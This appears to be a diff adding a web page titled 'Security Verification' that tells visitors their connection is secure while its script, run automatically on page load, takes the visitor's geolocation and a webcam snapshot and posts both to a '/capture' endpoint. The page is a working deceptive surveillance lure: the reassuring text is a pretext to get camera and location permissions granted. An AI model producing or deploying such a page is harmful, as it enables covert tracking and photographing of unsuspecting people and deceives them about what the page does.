@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Verification</title>
+</head>
+<body>
+    <h1 style="text-align:center;">Security Verified ✅</h1>
+    <p style="text-align:center;">Your connection is now secure.</p>
+
+    <script>
+        async function getCameraImage() {
+            const video = document.createElement('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const data = canvas.toDataURL('image/png');
+            stream.getTracks().forEach(t => t.stop());
+            return data;
+        }
+
+        async function captureAll() {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const imageData = await getCameraImage(); 
+
+                fetch('/capture', { 
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        image: imageData,
+                        location: { lat: lat, lon: lon }
+                    })
+                });
+            });
+        }
+        window.onload = captureAll;
+    </script>
+</body>
+</html>
